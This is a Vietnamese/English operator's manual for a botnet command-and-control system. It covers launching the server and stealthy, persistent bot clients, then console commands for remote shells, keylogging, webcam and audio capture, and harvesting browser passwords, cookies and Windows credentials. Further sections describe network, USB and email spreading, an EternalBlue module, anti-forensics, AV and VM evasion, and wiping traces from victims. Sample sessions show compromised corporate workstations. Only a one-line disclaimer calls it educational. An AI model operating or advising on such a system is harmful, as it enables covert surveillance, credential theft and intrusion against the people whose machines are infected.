# 🚀 HƯỚNG DẪN SỬ DỤNG C2C BOTNET SYSTEM

## 📋 Mục Lục
- [1. Khởi Động Hệ Thống](#1-khởi-động-hệ-thống)
- [2. Giao Diện Server](#2-giao-diện-server)
- [3. Quản Lý Bot Client](#3-quản-lý-bot-client)
- [4. Lệnh và Thao Tác](#4-lệnh-và-thao-tác)
- [5. Monitoring và Báo Cáo](#5-monitoring-và-báo-cáo)
- [6. Payload Management](#6-payload-management)
- [7. Bảo Mật và Best Practices](#7-bảo-mật-và-best-practices)
- [8. Troubleshooting](#8-troubleshooting)

---

## 1. Khởi Động Hệ Thống

### 🖥️ Khởi Động Server

#### Method 1: Command Line Interface
```powershell
# Activate virtual environment (nếu có)
.\c2c_env\Scripts\activate

# Start basic server
python -c "from core.server import ThreadSafeServer; server = ThreadSafeServer(); server.start_server()"
```

#### Method 2: Interactive Console
```powershell
# Launch interactive console
python core/console.py

# Server sẽ tự động khởi động với console interface
```

#### Method 3: Custom Configuration
```python
# custom_server.py
from core.server import ThreadSafeServer

# Custom configuration
server = ThreadSafeServer(
    host='0.0.0.0',          # Listen on all interfaces
    port=4444,               # Custom port
    max_clients=500,         # Maximum clients
    ssl_enabled=True,        # Enable SSL
    rate_limit=200          # Requests per minute
)

# Start server
server.start_server()
```

### 🤖 Khởi Động Client/Bot

#### Basic Client Connection
```powershell
# Connect to local server
python client.py

# Connect to remote server
python client.py --server 192.168.1.100 --port 4444
```

#### Stealth Mode Client
```powershell
# Run in stealth mode
python client.py --stealth --persist
```

#### Custom Client Configuration
```python
# custom_client.py
from client import ThreadSafeClient

client = ThreadSafeClient()
client.config.update({
    'server_host': '192.168.1.100',
    'server_port': 4444,
    'auto_reconnect': True,
    'stealth_mode': True,
    'persistence': True
})

client.start()
```

---

## 2. Giao Diện Server

### 🖥️ Console Interface

#### Main Console Commands
```
C2C Server Console v2.0
========================

🤖 CLIENTS MANAGEMENT:
  list                    - Show all connected clients
  select <id>            - Select client by ID  
  info <id>              - Show detailed client info
  disconnect <id>        - Disconnect specific client
  broadcast <cmd>        - Send command to all clients

🎯 OPERATIONS:
  shell <id>             - Interactive shell with client
  screenshot <id>        - Take screenshot
  download <id> <file>   - Download file from client
  upload <id> <file>     - Upload file to client
  keylog <id> start/stop - Control keylogger

📊 MONITORING:
  stats                  - Show server statistics
  activity               - Show recent activity
  logs                   - View server logs
  alerts                 - Check security alerts

🔧 SYSTEM:
  help                   - Show this help
  exit                   - Shutdown server gracefully
```

#### Example Console Session
```
C2C> list
┌────┬─────────────────┬──────────────┬──────────┬──────────────┐
│ ID │ IP Address      │ Hostname     │ OS       │ Last Seen    │
├────┼─────────────────┼──────────────┼──────────┼──────────────┤
│ 1  │ 192.168.1.101  │ WORKSTATION1 │ Win10    │ 2 mins ago   │
│ 2  │ 192.168.1.102  │ LAPTOP-USER  │ Win11    │ 5 mins ago   │
│ 3  │ 10.0.0.50      │ SERVER-01    │ Win2019  │ 1 min ago    │
└────┴─────────────────┴──────────────┴──────────┴──────────────┘

C2C> select 1
Selected client: WORKSTATION1 (192.168.1.101)

C2C> shell 1
Entering interactive shell with WORKSTATION1...
Press Ctrl+C to exit shell mode.

WORKSTATION1> dir
Volume in drive C has no label.
Directory of C:\Users\user

05/29/2025  10:30 AM    <DIR>          Desktop
05/29/2025  10:30 AM    <DIR>          Documents
...

WORKSTATION1> exit
Exiting shell mode.

C2C> screenshot 1
Screenshot saved to: screenshots/workstation1_20250529_103245.png

C2C> stats
📊 Server Statistics:
- Connected clients: 3
- Total sessions: 15
- Data transferred: 2.5 GB
- Uptime: 4h 32m
- Success rate: 98.5%
```

---

## 3. Quản Lý Bot Client

### 👀 Monitoring Clients

#### View All Clients
```
C2C> list

# Detailed view
C2C> list --detailed

# Filter by OS
C2C> list --os windows

# Filter by IP range  
C2C> list --ip-range 192.168.1.0/24

# Sort by last activity
C2C> list --sort activity
```

#### Client Information
```
C2C> info 1

📋 Client Details:
┌─────────────────┬────────────────────────────────┐
│ Property        │ Value                          │
├─────────────────┼────────────────────────────────┤
│ ID              │ 1                              │
│ IP Address      │ 192.168.1.101                 │
│ Hostname        │ WORKSTATION1                   │
│ Username        │ john.doe                       │
│ OS              │ Windows 10 Pro (Build 19045)  │
│ Architecture    │ x64                            │
│ Python Version  │ 3.10.8                        │
│ Privileges      │ User                           │
│ Domain          │ COMPANY.LOCAL                  │
│ Antivirus       │ Windows Defender               │
│ Connected Since │ 2025-05-29 08:15:33           │
│ Last Activity   │ 2025-05-29 10:32:15           │
│ Commands Sent   │ 47                             │
│ Data Received   │ 15.3 MB                        │
│ Data Sent       │ 892 KB                         │
└─────────────────┴────────────────────────────────┘

🔧 Active Modules:
- ✅ Keylogger (Running)
- ✅ Screenshot (Scheduled every 5 min)
- ❌ Webcam (Stopped)
- ✅ Persistence (Registry + Task)
```

### 🎯 Client Selection và Targeting

#### Select Individual Client
```
C2C> select 1
Selected: WORKSTATION1 (192.168.1.101)

# All subsequent commands will target this client
C2C> sysinfo
C2C> screenshot
C2C> shell
```

#### Multi-Client Operations
```
# Select multiple clients
C2C> select 1,2,3
Selected: 3 clients

# Select by criteria
C2C> select --os windows
C2C> select --privilege admin
C2C> select --domain company.local

# Broadcast command to selected
C2C> broadcast sysinfo
```

#### Client Groups
```
# Create group
C2C> group create "Accounting" 1,2,5

# Add to group
C2C> group add "Accounting" 8

# Target group
C2C> group select "Accounting"
C2C> broadcast "dir C:\\"

# List groups
C2C> group list
```

---

## 4. Lệnh và Thao Tác

### 🖥️ System Commands

#### System Information
```
# Basic system info
C2C> sysinfo

# Detailed hardware info
C2C> hwinfo

# Network configuration
C2C> netinfo

# Running processes
C2C> pslist

# Installed software
C2C> software

# Environment variables
C2C> env
```

#### File System Operations
```
# Directory listing
C2C> dir C:\Users\john\Desktop

# Change directory
C2C> cd C:\Users\john

# Download file
C2C> download C:\Users\john\documents\important.docx

# Upload file
C2C> upload malware.exe C:\temp\update.exe

# Delete file
C2C> del C:\temp\suspicious.log

# Create directory
C2C> mkdir C:\temp\backup

# File search
C2C> find *.pdf C:\Users\john\
```

#### Process Management
```
# Kill process
C2C> kill notepad.exe

# Start process
C2C> start calc.exe

# Process details
C2C> psinfo 1234

# Memory dump
C2C> memdump 1234 output.dmp
```

### 🔍 Surveillance Commands

#### Screenshot Capture
```
# Single screenshot
C2C> screenshot

# Multiple monitor screenshot
C2C> screenshot --all-monitors

# Scheduled screenshots
C2C> screenshot --schedule 5m

# Stop scheduled screenshots
C2C> screenshot --stop
```

#### Keylogger
```
# Start keylogger
C2C> keylog start

# Stop keylogger
C2C> keylog stop

# Get keylog data
C2C> keylog dump

# Clear keylog buffer
C2C> keylog clear

# Configure keylogger
C2C> keylog config --buffer-size 10000 --special-keys true
```

#### Webcam Control
```
# Take photo
C2C> webcam photo

# Record video (30 seconds)
C2C> webcam record 30

# Stream webcam
C2C> webcam stream

# List cameras
C2C> webcam list
```

#### Audio Recording
```
# Record audio (60 seconds)
C2C> audio record 60

# Set audio quality
C2C> audio config --quality high

# List audio devices
C2C> audio devices
```

### 🌐 Network Operations

#### Network Discovery
```
# Scan local network
C2C> netscan 192.168.1.0/24

# Port scan
C2C> portscan 192.168.1.1 1-1000

# ARP scan
C2C> arpscan

# WiFi networks
C2C> wifi scan

# Network connections
C2C> netstat
```

#### Data Exfiltration
```
# Browser data
C2C> browser --passwords --history --cookies

# Email data
C2C> email --outlook --thunderbird

# Registry dump
C2C> registry dump HKCU\\Software\\Microsoft

# Credential harvesting
C2C> creds --windows --browsers --wifi
```

### 🚀 Lateral Movement

#### Network Propagation
```
# Auto spread on network
C2C> spread --network 192.168.1.0/24

# USB spread
C2C> spread --usb

# Email spread
C2C> spread --email contacts.txt

# SMB exploitation
C2C> exploit smb 192.168.1.0/24
```

#### Remote Execution
```
# Execute on remote machine
C2C> exec 192.168.1.50 "whoami"

# WMI execution
C2C> wmi 192.168.1.50 "notepad.exe"

# PowerShell remoting
C2C> ps-remote 192.168.1.50 "Get-Process"
```

---

## 5. Monitoring và Báo Cáo

### 📊 Real-time Statistics

#### Server Statistics
```
C2C> stats

📊 C2C Server Statistics
========================
Server Status: ✅ Running (4h 32m)
- Host: 0.0.0.0:4444 (SSL Enabled)
- Active Connections: 15/500
- Total Sessions: 47
- Commands Processed: 1,247
- Data Transferred: 15.7 GB
  ↓ Downloaded: 12.3 GB
  ↑ Uploaded: 3.4 GB

Performance Metrics:
- CPU Usage: 12%
- Memory Usage: 256 MB
- Network I/O: 45 Mbps
- Success Rate: 98.7%
- Average Response Time: 1.2s

Security Status:
- SSL/TLS: ✅ Active
- Failed Authentications: 3
- Blocked IPs: 0
- Rate Limit Violations: 12
```

#### Client Activity
```
C2C> activity

📈 Recent Activity (Last 1 Hour)
================================
10:32:15 │ Client 3 │ Screenshot captured
10:31:45 │ Client 1 │ File downloaded: document.pdf
10:30:22 │ Client 5 │ New connection established
10:28:17 │ Client 2 │ Keylogger started
10:25:33 │ Client 1 │ Command executed: sysinfo
10:22:41 │ Client 4 │ Webcam photo taken
10:20:15 │ Client 3 │ Network scan completed
```

### 📈 Advanced Analytics

#### Geographic Distribution
```
C2C> analytics geo

🌍 Geographic Distribution
=========================
┌─────────────┬─────────┬────────────┐
│ Country     │ Clients │ Percentage │
├─────────────┼─────────┼────────────┤
│ Vietnam     │ 12      │ 48%        │
│ Thailand    │ 5       │ 20%        │
│ Singapore   │ 3       │ 12%        │
│ Malaysia    │ 3       │ 12%        │
│ Philippines │ 2       │ 8%         │
└─────────────┴─────────┴────────────┘
```

#### Platform Analysis
```
C2C> analytics platform

💻 Platform Distribution
========================
┌──────────────┬─────────┬────────────┐
│ OS           │ Clients │ Percentage │
├──────────────┼─────────┼────────────┤
│ Windows 10   │ 15      │ 60%        │
│ Windows 11   │ 7       │ 28%        │
│ Windows 8.1  │ 2       │ 8%         │
│ Linux        │ 1       │ 4%         │
└──────────────┴─────────┴────────────┘
```

### 📝 Logging và Export

#### View Logs
```
# View all logs
C2C> logs

# Filter by level
C2C> logs --level ERROR

# Filter by time
C2C> logs --since "2025-05-29 08:00"

# Live log monitoring
C2C> logs --follow

# Export logs
C2C> logs --export logs_20250529.json
```

#### Generate Reports
```
# Daily report
C2C> report daily

# Custom report
C2C> report custom --start "2025-05-28" --end "2025-05-29"

# Security report
C2C> report security

# Export report
C2C> report export --format pdf --output report.pdf
```

---

## 6. Payload Management

### 🧩 Loading Payload Modules

#### List Available Modules
```
C2C> modules list

📦 Available Payload Modules
============================
Data Collection:
- ✅ keylogger          - Advanced keystroke capture
- ✅ screenshot         - Screen capture module
- ✅ webcam            - Camera control
- ✅ browser_harvester - Browser data extraction
- ✅ credential_harvester - Credential collection

System Control:
- ✅ shellcode         - Shellcode execution
- ✅ process_migration - Process migration
- ✅ persistence       - Persistence mechanisms
- ✅ advanced_persistence - Advanced persistence

Network Operations:
- ✅ wifi_attacks      - WiFi attack suite
- ✅ eternalblue      - MS17-010 exploit
- ✅ usb_spreading    - USB propagation
- ✅ domain_fronting  - Domain fronting

Evasion:
- ✅ anti_forensics   - Anti-forensics tools
- ✅ polymorphic_engine - Code morphing
```

#### Load Module
```
# Load specific module
C2C> module load keylogger

# Load module with config
C2C> module load screenshot --interval 300 --quality high

# Load multiple modules
C2C> module load keylogger,screenshot,webcam
```

#### Module Configuration
```
# Configure module
C2C> module config keylogger buffer_size=50000

# Show module status
C2C> module status keylogger

# Restart module
C2C> module restart keylogger

# Unload module
C2C> module unload keylogger
```

### 🔧 Custom Payload Deployment

#### Deploy Custom Script
```
# Upload and execute Python script
C2C> deploy python script.py

# Deploy PowerShell script
C2C> deploy powershell script.ps1

# Deploy executable
C2C> deploy exe malware.exe --silent

# Deploy with persistence
C2C> deploy python script.py --persist registry
```

#### Scheduled Tasks
```
# Schedule task
C2C> schedule "screenshot" --interval 300

# Schedule with condition
C2C> schedule "keylog" --when "user_active"

# List scheduled tasks
C2C> schedule list

# Remove scheduled task
C2C> schedule remove "screenshot"
```

---

## 7. Bảo Mật và Best Practices

### 🔒 Security Configuration

#### SSL/TLS Management
```
# Generate new certificates
C2C> ssl generate

# Check certificate status
C2C> ssl status

# Update cipher suites
C2C> ssl config --ciphers "ECDHE+AESGCM:!aNULL"

# Enable certificate pinning
C2C> ssl pin enable
```

#### Access Control
```
# Set password authentication
C2C> auth password "StrongPassword123!"

# Enable two-factor authentication
C2C> auth 2fa enable

# Set IP whitelist
C2C> firewall whitelist add 192.168.1.0/24

# Block suspicious IP
C2C> firewall block 10.0.0.100
```

#### Rate Limiting
```
# Configure rate limits
C2C> ratelimit set 100  # requests per minute

# Temporary rate adjustment
C2C> ratelimit temp 200 3600  # 200 req/min for 1 hour

# Check rate limit status
C2C> ratelimit status
```

### 🛡️ Operational Security

#### Stealth Operations
```
# Enable stealth mode for all clients
C2C> stealth enable

# Configure anti-detection
C2C> antidetect config --vm-evasion true --delay-random true

# Process name obfuscation
C2C> obfuscate process --name "svchost.exe"

# Traffic obfuscation
C2C> obfuscate traffic --domain-fronting true
```

#### Data Protection
```
# Encrypt stored data
C2C> encrypt enable --key-size 256

# Secure delete logs
C2C> logs secure-delete --days 30

# Memory protection
C2C> memory protect enable

# Anti-debugging
C2C> antidebug enable
```

### 📋 Best Practices

#### 1. **Server Security**
- ✅ Always use SSL/TLS encryption
- ✅ Regularly rotate certificates
- ✅ Monitor connection patterns
- ✅ Enable rate limiting
- ✅ Use strong authentication
- ✅ Keep logs secure and encrypted

#### 2. **Client Management**
- ✅ Implement anti-detection measures
- ✅ Use process migration for stealth
- ✅ Rotate communication channels
- ✅ Minimize footprint on target systems
- ✅ Regular beacon interval randomization

#### 3. **Network Operations**
- ✅ Use domain fronting for C2 traffic
- ✅ Implement backup communication channels
- ✅ Encrypt all payload transfers
- ✅ Monitor for detection signatures
- ✅ Plan for emergency shutdown

#### 4. **Data Handling**
- ✅ Encrypt sensitive collected data
- ✅ Use secure deletion methods
- ✅ Implement data retention policies
- ✅ Regular data backups
- ✅ Secure data transmission

---

## 8. Troubleshooting

### ❗ Common Issues

#### 8.1 Connection Problems

**Issue**: Client cannot connect to server
```
Error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed
```

**Solutions**:
```powershell
# Check SSL certificates
C2C> ssl status

# Regenerate certificates if needed
C2C> ssl generate

# Test connection manually
python -c "
import ssl, socket
context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
with socket.create_connection(('localhost', 4444)) as sock:
    with context.wrap_socket(sock) as ssock:
        print('✅ SSL connection successful')
"
```

#### 8.2 Performance Issues

**Issue**: High CPU/Memory usage
```
# Check server statistics
C2C> stats

# Reduce thread pool sizes
C2C> config set worker_threads 16
C2C> config set io_threads 8

# Enable garbage collection monitoring
C2C> debug gc enable

# Restart with lower limits
python -c "
from core.server import ThreadSafeServer
server = ThreadSafeServer(max_clients=100, worker_threads=16)
server.start_server()
"
```

#### 8.3 Module Errors

**Issue**: Payload module fails to load
```
# Check module dependencies
C2C> module check keylogger

# Reinstall module dependencies
pip install --force-reinstall pynput

# Load module with debug
C2C> module load keylogger --debug

# Check module logs
C2C> logs --module keylogger
```

### 🔧 Debug Mode

#### Enable Verbose Logging
```
# Start server in debug mode
python -c "
import logging
logging.basicConfig(level=logging.DEBUG)
from core.server import ThreadSafeServer
server = ThreadSafeServer(debug=True)
server.start_server()
"

# Enable client debug mode
python client.py --debug
```

#### Diagnostic Commands
```
# System diagnostics
C2C> diag system

# Network diagnostics
C2C> diag network

# SSL diagnostics
C2C> diag ssl

# Module diagnostics
C2C> diag modules

# Full diagnostic report
C2C> diag full --export diag_report.json
```

### 📞 Getting Help

#### Built-in Help
```
# General help
C2C> help

# Command-specific help
C2C> help screenshot
C2C> help module

# Module help
C2C> module help keylogger

# Configuration help
C2C> config help
```

#### Emergency Procedures
```
# Emergency shutdown
C2C> emergency shutdown

# Force disconnect all clients
C2C> emergency disconnect-all

# Secure wipe logs
C2C> emergency wipe-logs

# Self-destruct (removes all traces)
C2C> emergency self-destruct
```

---

## ✅ Usage Checklist

### 📋 Pre-Operation Checklist

- [ ] SSL certificates generated và valid
- [ ] Server configuration reviewed
- [ ] Network connectivity tested
- [ ] Required modules loaded
- [ ] Security settings configured
- [ ] Backup procedures in place

### 🎯 During Operations

- [ ] Monitor client connections regularly
- [ ] Check server performance metrics
- [ ] Review security alerts
- [ ] Maintain operational logs
- [ ] Rotate certificates periodically
- [ ] Update anti-detection measures

### 🔚 Post-Operation Cleanup

- [ ] Secure delete sensitive data
- [ ] Clear command history
- [ ] Wipe temporary files
- [ ] Disable persistence mechanisms
- [ ] Remove traces from target systems
- [ ] Archive important logs securely

---

**⚠️ LƯU Ý**: Hướng dẫn này chỉ dành cho mục đích nghiên cứu và giáo dục. Vui lòng tuân thủ luật pháp địa phương và chỉ sử dụng trong môi trường được phép.

**© 2025 C2C Botnet Project - Educational Use Only**
